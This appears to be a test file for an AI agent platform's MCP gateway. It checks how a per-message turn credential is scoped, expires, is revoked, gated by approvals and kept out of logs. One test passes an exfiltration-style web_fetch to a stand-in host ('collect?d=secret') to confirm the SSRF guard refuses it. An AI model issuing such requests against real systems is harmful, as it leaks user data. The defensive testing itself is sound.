// SPDX-License-Identifier: FSL-1.1-ALv2
//
// S59 / D37 / A34: the desktop's local turn presents the credential the server
// minted for the person's message, and the gateway then runs that call as a
// GATEWAY TURN of that person: their computer sessions can be listed, read,
// stopped and set as in the cloud, while a message, an answer and an autonomy
// change park as an approval in the person's conversation. Everything here goes
// through the real routes: the message read mints, `POST /mcp` presents.
import { afterAll, afterEach, beforeAll, describe, expect, it } from "bun:test"
import { NODE_TURN_CREDENTIAL_HEADER } from "@liaison/shared"
import pino from "pino"
import { app } from "~/app"
import { sql } from "~/db"
import { env } from "~/lib/env"
import { rootLogger } from "~/lib/logger"
import { redis } from "~/lib/redis"
import {
  lookupTurnCredential,
  TURN_CREDENTIAL_TTL_MS,
  turnCredentialClock,
} from "~/modules/agent/local-sessions/turn-credential"
import { AgentServiceTestAccess } from "~/modules/agent/runtime/agent-service"
import { captureSpawnParentFrame, runContextStore } from "~/modules/agent/runtime/run-context"
import { registerKernelAgentTools } from "~/modules/agent/tools/kernel-tools"
import { signAccessToken } from "~/modules/auth/jwt"
import {
  mcpTurnTaintKey,
  mcpTurnTaintMarksKey,
  mcpTurnTaintOriginsKey,
  mcpTurnTaintTouchedKey,
  mintAccessToken,
} from "~/modules/mcp/connection-service"
import { ensureConnectionThread } from "~/modules/mcp/connection-thread"
import { seedMcpConnection } from "~/modules/mcp/test-helpers"
import { createNodeJob } from "~/modules/nodes/jobs"
import * as minimal from "~/seed/tiers/minimal"
import { createTestOrg } from "~/tests/helpers/org"
import { acquireTestLock, releaseTestLock } from "~/tests/route-test-setup"

const HOLDER = "holder-gateway-turn"
const MODEL = "claude-haiku-4-5"
const MCP_HEADERS = {
  "content-type": "application/json",
  accept: "application/json, text/event-stream",
}

/** What the callee of an `agents_ask` got when it tried to list sessions. */
let calleeListResult: unknown = "not called"

function fakeStream(options?: {
  tools?: Record<string, { execute?: (input: unknown, opts: unknown) => Promise<unknown> }>
}) {
  const list = options?.tools?.kernel__computer_session_list
  return {
    fullStream: (async function* () {
      calleeListResult = list?.execute
        ? await list.execute({}, { toolCallId: "callee-list", messages: [] })
        : "absent from the callee's tools"
      yield { type: "text-delta", text: "I cannot reach their sessions from here." }
      yield {
        type: "finish-step",
        usage: { inputTokens: 1, outputTokens: 1 },
        finishReason: "stop",
      }
      yield { type: "finish", finishReason: "stop" }
    })(),
  } as never
}

describe("the desktop's gateway turn (S59)", () => {
  let owner: minimal.Session
  let colleague: minimal.Session
  let agentId: string
  let otherAgentId: string
  let colleagueAgentId: string
  let calleeHandle: string
  let threadId: string
  let colleagueThreadId: string
  let nodeId: string
  let desktopToken: string
  let desktopConnectionId: string
  let rpcId = 0

  const request = (path: string, method: string, body?: unknown, bearer?: string) =>
    app.request(path, {
      method,
      headers: {
        Authorization: `Bearer ${bearer ?? owner.bearer}`,
        "Content-Type": "application/json",
      },
      body: body === undefined ? undefined : JSON.stringify(body),
    })

  /** One `tools/call` over the real MCP transport. */
  async function gw(
    token: string,
    name: string,
    args: Record<string, unknown>,
    turn?: string,
  ): Promise<{ body: any; text: string }> {
    const res = await app.request("/mcp", {
      method: "POST",
      headers: {
        ...MCP_HEADERS,
        Authorization: `Bearer ${token}`,
        ...(turn ? { [NODE_TURN_CREDENTIAL_HEADER]: turn } : {}),
      },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: ++rpcId,
        method: "tools/call",
        params: { name, arguments: args },
      }),
    })
    expect(res.status).toBe(200)
    const raw = await res.text()
    const line = raw
      .split("\n")
      .filter((l) => l.startsWith("data:"))
      .pop()
    const msg = JSON.parse(line ? line.slice(5) : raw) as { result: any }
    const result = msg.result
    const body = result.structuredContent ?? JSON.parse(result.content?.[0]?.text ?? "null")
    return { body, text: JSON.stringify(result) }
  }

  /** Claim the conversation for `agent` and post one message of the person. */
  async function personAsks(
    opts: { agent?: string; thread?: string; who?: minimal.Session } = {},
  ): Promise<string> {
    const who = opts.who ?? owner
    const agent = opts.agent ?? agentId
    const thread = opts.thread ?? threadId
    const claimed = await request(
      `/api/agents/${agent}/local-claims`,
      "POST",
      { threadId: thread, holderKey: HOLDER },
      who.bearer,
    )
    expect(claimed.status).toBe(200)
    const [row] = await sql<{ id: string }[]>`
      INSERT INTO kernel.messages (thread_id, org_id, author_id, author_type, content, required_scopes)
      VALUES (${thread}, ${owner.orgId}, ${who.userId}, 'user', 'what are my sessions doing?', '{}')
      RETURNING id`
    return row.id
  }

  /** The desktop's re-read of that message: the credential it carries. */
  async function mint(
    messageId: string,
    opts: { agent?: string; thread?: string; bearer?: string } = {},
  ): Promise<string> {
    const res = await request(
      `/api/agents/${opts.agent ?? agentId}/local-claims/${opts.thread ?? threadId}/messages/${messageId}?holderKey=${HOLDER}`,
      "GET",
      undefined,
      opts.bearer,
    )
    expect(res.status).toBe(200)
    const cred = ((await res.json()) as { data: { turnCredential?: string } }).data.turnCredential
    expect(typeof cred).toBe("string")
    return cred as string
  }

  async function queuedSession(): Promise<string> {
    const job = await createNodeJob({
      orgId: owner.orgId,
      ownerUserId: owner.userId,
      agentId,
      threadId,
      source: "dispatch",
      prompt: "Fix the flaky test",
      sourceRequiredScopes: [],
      targetNodeId: nodeId,
      session: {
        source: "dispatch",
        configKind: "owner",
        model: MODEL,
        level: "strict",
        title: "Fix the flaky test",
        sourceThreadId: threadId,
      },
    })
    await sql`UPDATE kernel.node_sessions SET node_id = ${nodeId} WHERE id = ${job.sessionId!}`
    return job.sessionId as string
  }

  const approvalsIn = async (): Promise<Array<{ thread_id: string; tool_name: string }>> => [
    ...(await sql<Array<{ thread_id: string; tool_name: string }>>`
      SELECT thread_id, tool_name FROM kernel.approval_requests WHERE org_id = ${owner.orgId}
       ORDER BY created_at`),
  ]
  const commands = (sessionId: string) =>
    sql<Array<{ type: string }>>`
      SELECT type FROM kernel.node_session_commands WHERE session_id = ${sessionId}`

  const isGatewayRefusal = (text: string) =>
    text.includes("interactive_only") && text.includes("not from this connection")

  beforeAll(async () => {
    await acquireTestLock()
    AgentServiceTestAccess.setStreamText(fakeStream as never)
    const org = await createTestOrg()
    owner = await minimal.session(org.id, { role: "admin" })
    colleague = await minimal.session(org.id, { role: "admin" })
    const personal = async (who: minimal.Session, name: string) =>
      (
        await sql<{ id: string }[]>`
          INSERT INTO kernel.agents (org_id, kind, handle, display_name, scope_ceiling, owner_user_id)
          VALUES (${owner.orgId}, 'personal', ${`@gt-${crypto.randomUUID().slice(0, 8)}`}, ${name},
                  '["*"]'::jsonb, ${who.userId})
          RETURNING id`
      )[0].id
    agentId = await personal(owner, "Olive")
    otherAgentId = await personal(owner, "Second")
    colleagueAgentId = await personal(colleague, "Riley")
    calleeHandle = `@gt-callee-${crypto.randomUUID().slice(0, 8)}`
    await sql`INSERT INTO kernel.agents (org_id, kind, handle, display_name, scope_ceiling)
      VALUES (${owner.orgId}, 'role', ${calleeHandle}, 'Callee', '["*"]'::jsonb)`
    await sql`INSERT INTO kernel.credit_balances (org_id, included_balance, purchased_balance, currency)
      VALUES (${owner.orgId}, '10.00000000', '5.00000000', 'EUR') ON CONFLICT DO NOTHING`
    await sql`INSERT INTO kernel.model_pricing
        (provider, model_id, display_name, input_cost_per_m, output_cost_per_m, context_window, auto_eligible, tier_minimum)
      VALUES ('anthropic', ${MODEL}, 'Claude Haiku 4.5', '1.00', '5.00', 200000, true, 'starter')
      ON CONFLICT (provider, model_id) DO NOTHING`
    await registerKernelAgentTools(owner.orgId)
    threadId = await minimal.thread(owner.orgId, owner.userId)
    colleagueThreadId = await minimal.thread(owner.orgId, colleague.userId)

    const node = await request("/api/nodes", "POST", {
      deviceId: `d.${crypto.randomUUID()}`,
      name: "Studio Mac",
    })
    expect(node.status).toBe(201)
    nodeId = ((await node.json()) as { data: { node: { id: string } } }).data.node.id

    // The desktop's own agent connection, as the app opens it.
    const conn = await request("/mcp/desktop/connection", "POST", { agentId })
    expect(conn.status).toBe(200)
    desktopToken = ((await conn.json()) as { data: { accessToken: string } }).data.accessToken
    desktopConnectionId = (
      await sql<{ id: string }[]>`
        SELECT id FROM kernel.mcp_connections WHERE org_id = ${owner.orgId} AND agent_id = ${agentId}`
    )[0].id
  })

  afterEach(async () => {
    turnCredentialClock.now = () => Date.now()
    calleeListResult = "not called"
    await sql`DELETE FROM kernel.approval_requests WHERE org_id = ${owner.orgId}`
    await sql`DELETE FROM kernel.node_sessions WHERE org_id = ${owner.orgId}`
    await sql`DELETE FROM kernel.node_jobs WHERE org_id = ${owner.orgId}`
    await sql`DELETE FROM kernel.agent_local_claims WHERE org_id = ${owner.orgId}`
    await sql`DELETE FROM kernel.messages WHERE thread_id IN (${threadId}, ${colleagueThreadId})`
    await sql`UPDATE kernel.threads SET tainted = false WHERE org_id = ${owner.orgId}`
  })

  afterAll(async () => {
    AgentServiceTestAccess.setStreamText()
    await sql`DELETE FROM kernel.mcp_connections WHERE org_id = ${owner.orgId}`
    await sql`DELETE FROM kernel.nodes WHERE org_id = ${owner.orgId}`
    await releaseTestLock()
  })

  it("S59: a gateway computer_session_list with a valid credential lists the owner's sessions; computer_session_stop applies", async () => {
    const sessionId = await queuedSession()
    // The base: the same connection without the credential is refused both.
    const bare = await gw(desktopToken, "kernel__computer_session_list", {})
    expect(isGatewayRefusal(bare.text)).toBe(true)

    const cred = await mint(await personAsks())
    const listed = await gw(desktopToken, "kernel__computer_session_list", {}, cred)
    expect(isGatewayRefusal(listed.text)).toBe(false)
    expect(listed.body.sessions.map((s: { sessionId: string }) => s.sessionId)).toEqual([sessionId])

    const read = await gw(desktopToken, "kernel__computer_session_read", { sessionId }, cred)
    expect(read.body.sessionId ?? read.body.session?.sessionId).toBe(sessionId)

    const stopped = await gw(desktopToken, "kernel__computer_session_stop", { sessionId }, cred)
    expect(["stopped", "stopping"]).toContain(stopped.body.status)
    expect(stopped.body.sessionId).toBe(sessionId)
    expect(await approvalsIn()).toHaveLength(0)
  })

  it("S59: computer_session_send with a valid credential parks as an approval in the person's conversation (gatewayTurn.threadId), never in the connection thread, even when neither thread is tainted", async () => {
    const sessionId = await queuedSession()
    const cred = await mint(await personAsks())
    const sent = await gw(
      desktopToken,
      "kernel__computer_session_send",
      { sessionId, text: "also run the linter" },
      cred,
    )
    expect(sent.body).toMatchObject({ gated: true, executed: false })
    expect(sent.body.approvalUrl).toBe(`${env.BASE_URL}/threads/${threadId}`)
    const parked = await approvalsIn()
    expect(parked).toEqual([{ thread_id: threadId, tool_name: "kernel:computer_session_send" }])
    const [conn] = await sql<{ thread_id: string | null }[]>`
      SELECT thread_id FROM kernel.mcp_connections WHERE id = ${desktopConnectionId}`
    expect(parked[0].thread_id).not.toBe(conn.thread_id)
    expect(await commands(sessionId)).toHaveLength(0)

    // An autonomy change parks the same way; a model change applies.
    const autonomy = await gw(
      desktopToken,
      "kernel__computer_session_settings",
      { sessionId, autonomy: "autonomous" },
      cred,
    )
    expect(autonomy.body).toMatchObject({ gated: true, executed: false })
    expect((await approvalsIn()).map((a) => a.thread_id)).toEqual([threadId, threadId])
  })

  it("S59: computer_session_send with a valid credential while the person's conversation is tainted parks; while only the connection thread is tainted parks", async () => {
    const sessionId = await queuedSession()
    const connectionThread = await ensureConnectionThread(
      desktopConnectionId,
      owner.orgId,
      owner.userId,
    )
    for (const tainted of [threadId, connectionThread]) {
      await sql`UPDATE kernel.threads SET tainted = (id = ${tainted}) WHERE id IN (${threadId}, ${connectionThread})`
      const cred = await mint(await personAsks())
      const sent = await gw(
        desktopToken,
        "kernel__computer_session_send",
        { sessionId, text: "go on" },
        cred,
      )
      expect(sent.body).toMatchObject({ gated: true, executed: false })
      await sql`DELETE FROM kernel.messages WHERE thread_id = ${threadId}`
    }
    expect((await approvalsIn()).map((a) => a.thread_id)).toEqual([threadId, threadId])
    expect(await commands(sessionId)).toHaveLength(0)

    // Taint is still MARKED on both threads, but a web read never parks for
    // it: since "Web reads never park" (#476, scope-taint rule 9) web_fetch is
    // bounded by the web-read guardrails and the fetch policy instead, on
    // every surface the MCP gateway included. So the fetch after only the
    // connection thread read outside text is answered inline, here by the
    // fetch's own refusal (the host does not resolve to a public address):
    // nothing is parked and the SSRF guard still holds. (The agent's
    // scope-taint window from the calls above is a separate rule, cleared so
    // only the thread marks decide.)
    for (const key of [
      mcpTurnTaintKey,
      mcpTurnTaintMarksKey,
      mcpTurnTaintOriginsKey,
      mcpTurnTaintTouchedKey,
    ]) {
      await redis.del(key(owner.orgId, agentId))
    }
    await sql`UPDATE kernel.threads SET tainted = (id = ${connectionThread}) WHERE id IN (${threadId}, ${connectionThread})`
    const approvalsBefore = (await approvalsIn()).length
    const fetched = await gw(
      desktopToken,
      "kernel__web_fetch",
      { url: "https://example.invalid/collect?d=secret" },
      await mint(await personAsks()),
    )
    expect(fetched.body).toMatchObject({
      code: "tool_error",
      message: "Requests to private/internal network addresses are not allowed",
    })
    expect(fetched.body.gated).toBeUndefined()
    expect(await approvalsIn()).toHaveLength(approvalsBefore)
  })

  it("S59: run_on_my_computer with a valid credential parks as an approval, exactly as without it", async () => {
    const bare = await gw(desktopToken, "kernel__run_on_my_computer", { task: "run the tests" })
    expect(bare.body).toMatchObject({ gated: true, executed: false })
    const cred = await mint(await personAsks())
    const credentialed = await gw(
      desktopToken,
      "kernel__run_on_my_computer",
      { task: "run the tests" },
      cred,
    )
    expect(credentialed.body).toMatchObject({ gated: true, executed: false })
    expect(await sql`SELECT id FROM kernel.node_jobs WHERE org_id = ${owner.orgId}`).toHaveLength(0)
  })

  it("S59: the credential presented on another connection of the same user and agent (a device-flow MCP client) is refused", async () => {
    await queuedSession()
    const cred = await mint(await personAsks())
    for (const [clientId, label] of [
      ["mcp:cli", "cli"],
      // A device grant started under the desktop's own client id, labelled
      // like the desktop's connection: still not that connection.
      ["mcp:liaison-desktop", "Liaison desktop"],
    ]) {
      const conn = await seedMcpConnection({
        orgId: owner.orgId,
        userId: owner.userId,
        clientId,
        label,
        agentId,
      })
      const { token } = await mintAccessToken(conn.id)
      const listed = await gw(token, "kernel__computer_session_list", {}, cred)
      expect({ clientId, refused: isGatewayRefusal(listed.text) }).toEqual({
        clientId,
        refused: true,
      })
    }
    // The desktop's own connection still takes it.
    const own = await gw(desktopToken, "kernel__computer_session_list", {}, cred)
    expect(isGatewayRefusal(own.text)).toBe(false)
  })

  it("S59: presented on a node-session connection it is refused", async () => {
    const sessionId = await queuedSession()
    const cred = await mint(await personAsks())
    await sql`UPDATE kernel.node_jobs SET mcp_connection_id = ${desktopConnectionId}
               WHERE org_id = ${owner.orgId}`
    const listed = await gw(desktopToken, "kernel__computer_session_list", {}, cred)
    expect(isGatewayRefusal(listed.text) || listed.text.includes("not_from_a_session")).toBe(true)
    expect(listed.text).not.toContain(sessionId)
  })

  it("S59: a credential older than 30 min is refused", async () => {
    await queuedSession()
    const cred = await mint(await personAsks())
    const mintedAt = Date.now()
    turnCredentialClock.now = () => mintedAt + TURN_CREDENTIAL_TTL_MS - 60_000
    expect(
      isGatewayRefusal((await gw(desktopToken, "kernel__computer_session_list", {}, cred)).text),
    ).toBe(false)
    turnCredentialClock.now = () => mintedAt + TURN_CREDENTIAL_TTL_MS + 60_000
    expect(
      isGatewayRefusal((await gw(desktopToken, "kernel__computer_session_list", {}, cred)).text),
    ).toBe(true)
  })

  it("S59 (batch-2 F11): once the claim lapsed, the credential is refused and revoked at once, before any sweep", async () => {
    await queuedSession()
    const cred = await mint(await personAsks())
    expect(
      isGatewayRefusal((await gw(desktopToken, "kernel__computer_session_list", {}, cred)).text),
    ).toBe(false)
    await sql`UPDATE kernel.agent_local_claims SET expires_at = now() - interval '1 second'
              WHERE org_id = ${owner.orgId} AND thread_id = ${threadId}`
    expect(
      isGatewayRefusal((await gw(desktopToken, "kernel__computer_session_list", {}, cred)).text),
    ).toBe(true)
    // Revoked, not merely refused: a renewed claim does not bring it back.
    expect(await lookupTurnCredential(cred)).toBeNull()
    await sql`UPDATE kernel.agent_local_claims SET expires_at = now() + interval '5 minutes'
              WHERE org_id = ${owner.orgId} AND thread_id = ${threadId}`
    expect(
      isGatewayRefusal((await gw(desktopToken, "kernel__computer_session_list", {}, cred)).text),
    ).toBe(true)
  })

  it("S59: a credential revoked by the turn's reply is refused (no replay)", async () => {
    await queuedSession()
    const cred = await mint(await personAsks())
    const started = await request(`/api/agents/${agentId}/local-sessions`, "POST", {
      permissionMode: "manual",
      folderHash: "a".repeat(64),
      model: MODEL,
    })
    const sessionId = ((await started.json()) as { data: { sessionId: string } }).data.sessionId
    expect(
      isGatewayRefusal((await gw(desktopToken, "kernel__computer_session_list", {}, cred)).text),
    ).toBe(false)
    const replied = await request(
      `/api/agents/${agentId}/local-sessions/${sessionId}/reply`,
      "POST",
      {
        threadId,
        text: "Here they are.",
        holderKey: HOLDER,
      },
    )
    expect(replied.status).toBe(201)
    expect(
      isGatewayRefusal((await gw(desktopToken, "kernel__computer_session_list", {}, cred)).text),
    ).toBe(true)
  })

  it("S59: agents_ask from a credentialed gateway call: the callee's computer_session_list is refused", async () => {
    await queuedSession()
    const cred = await mint(await personAsks())
    const asked = await gw(
      desktopToken,
      "kernel__agents_ask",
      { agentHandle: calleeHandle, question: "list my computer sessions" },
      cred,
    )
    expect(asked.text).not.toContain("tool_not_found")
    const deadline = Date.now() + 5_000
    while (calleeListResult === "not called" && Date.now() < deadline) await Bun.sleep(20)
    const seen = JSON.stringify(calleeListResult)
    expect(seen).toContain("interactive_only")
    expect(seen).not.toContain("Fix the flaky test")
  })

  it("S59: a sub-run spawned from a gateway turn does not inherit it", () => {
    // The one capture every spawn path takes from the calling frame
    // (spawn-agent.ts, the sandbox bridge): it has no field that could carry
    // the gateway turn, and a sub-run nests below (nestingDepth > 0, refused).
    const runId = crypto.randomUUID()
    const captured = runContextStore.run(
      {
        runId,
        parentRunId: null,
        rootRunId: runId,
        nestingDepth: 0,
        mcpGateway: true,
        gatewayTurn: { threadId, messageId: crypto.randomUUID() },
        agentId,
        agentCeiling: ["*"],
        effectiveScope: ["*"],
      },
      () => captureSpawnParentFrame(),
    )
    expect(captured).not.toBeNull()
    expect(Object.hasOwn(captured ?? {}, "gatewayTurn")).toBe(false)
    expect(captured?.agentId).toBe(agentId)
    expect(JSON.stringify(captured)).not.toContain("gatewayTurn")
    expect(captured?.run?.nestingDepth).toBe(0)
  })

  it("S59: a routine-originated call carrying the header stays refused", async () => {
    await queuedSession()
    // A routine's post in the conversation is the agent's, never the person's: nothing is minted.
    await request(`/api/agents/${agentId}/local-claims`, "POST", { threadId, holderKey: HOLDER })
    const [routinePost] = await sql<{ id: string }[]>`
      INSERT INTO kernel.messages (thread_id, org_id, author_id, author_type, author_agent_id, content,
                                   required_scopes, metadata)
      VALUES (${threadId}, ${owner.orgId}, ${owner.userId}, 'agent', ${agentId}, 'Daily check',
              '{}', ${JSON.stringify({ routineId: crypto.randomUUID() })}::jsonb)
      RETURNING id`
    const read = await request(
      `/api/agents/${agentId}/local-claims/${threadId}/messages/${routinePost.id}?holderKey=${HOLDER}`,
      "GET",
    )
    expect(((await read.json()) as { data: object }).data).not.toHaveProperty("turnCredential")
    // Whatever such a run sends as the header is refused like none at all.
    for (const header of ["A".repeat(43), "not-a-credential", routinePost.id]) {
      const listed = await gw(desktopToken, "kernel__computer_session_list", {}, header)
      expect(isGatewayRefusal(listed.text)).toBe(true)
    }
  })

  it("S59: without the header, or with a credential minted for another agent or another user, list is refused with the gateway refusal", async () => {
    await queuedSession()
    const bare = await gw(desktopToken, "kernel__computer_session_list", {})
    expect(isGatewayRefusal(bare.text)).toBe(true)

    const forOtherAgent = await mint(await personAsks({ agent: otherAgentId }), {
      agent: otherAgentId,
    })
    expect(
      isGatewayRefusal(
        (await gw(desktopToken, "kernel__computer_session_list", {}, forOtherAgent)).text,
      ),
    ).toBe(true)

    const forColleague = await mint(
      await personAsks({ agent: colleagueAgentId, thread: colleagueThreadId, who: colleague }),
      { agent: colleagueAgentId, thread: colleagueThreadId, bearer: colleague.bearer },
    )
    expect(
      isGatewayRefusal(
        (await gw(desktopToken, "kernel__computer_session_list", {}, forColleague)).text,
      ),
    ).toBe(true)
  })

  it("S59: a credential minted from a restricted (device-flow) session: list works, send and stop are refused restricted_session", async () => {
    const sessionId = await queuedSession()
    const messageId = await personAsks()
    const claims = JSON.parse(
      Buffer.from(owner.bearer.split(".")[1] as string, "base64url").toString(),
    ) as Record<string, unknown>
    delete claims.iat
    delete claims.exp
    const restricted = await signAccessToken(
      { ...(claims as unknown as Parameters<typeof signAccessToken>[0]), restricted: true },
      env.JWT_SECRET,
    )
    const cred = await mint(messageId, { bearer: restricted })
    const listed = await gw(desktopToken, "kernel__computer_session_list", {}, cred)
    expect(isGatewayRefusal(listed.text)).toBe(false)
    expect(listed.body.sessions).toHaveLength(1)
    const sent = await gw(
      desktopToken,
      "kernel__computer_session_send",
      { sessionId, text: "go" },
      cred,
    )
    expect(sent.text).toContain("restricted_session")
    const stopped = await gw(desktopToken, "kernel__computer_session_stop", { sessionId }, cred)
    expect(stopped.text).toContain("restricted_session")
    expect(await commands(sessionId)).toHaveLength(0)
    expect(await approvalsIn()).toHaveLength(0)
  })

  it("S59: the credential is never in a log line", async () => {
    const stream = (rootLogger as unknown as Record<symbol, { write: (s: string) => unknown }>)[
      pino.symbols.streamSym
    ]
    const lines: string[] = []
    const original = stream.write
    stream.write = function (this: unknown, chunk: string) {
      lines.push(String(chunk))
      return original.call(stream, chunk)
    }
    let cred = ""
    try {
      await queuedSession()
      cred = await mint(await personAsks())
      await gw(desktopToken, "kernel__computer_session_list", {}, cred)
      await gw(
        desktopToken,
        "kernel__computer_session_send",
        { sessionId: crypto.randomUUID(), text: "x" },
        cred,
      )
      // Refused presentations log why, never what.
      await turnRefusedOnOtherConnection(cred)
    } finally {
      stream.write = original
    }
    expect(cred.length).toBe(43)
    expect(lines.some((l) => l.includes("turn credential"))).toBe(true)
    for (const line of lines) expect(line).not.toContain(cred)
  })

  async function turnRefusedOnOtherConnection(cred: string) {
    const conn = await seedMcpConnection({
      orgId: owner.orgId,
      userId: owner.userId,
      clientId: "mcp:script",
      label: "script",
      agentId,
    })
    const { token } = await mintAccessToken(conn.id)
    await gw(token, "kernel__computer_session_list", {}, cred)
  }
})
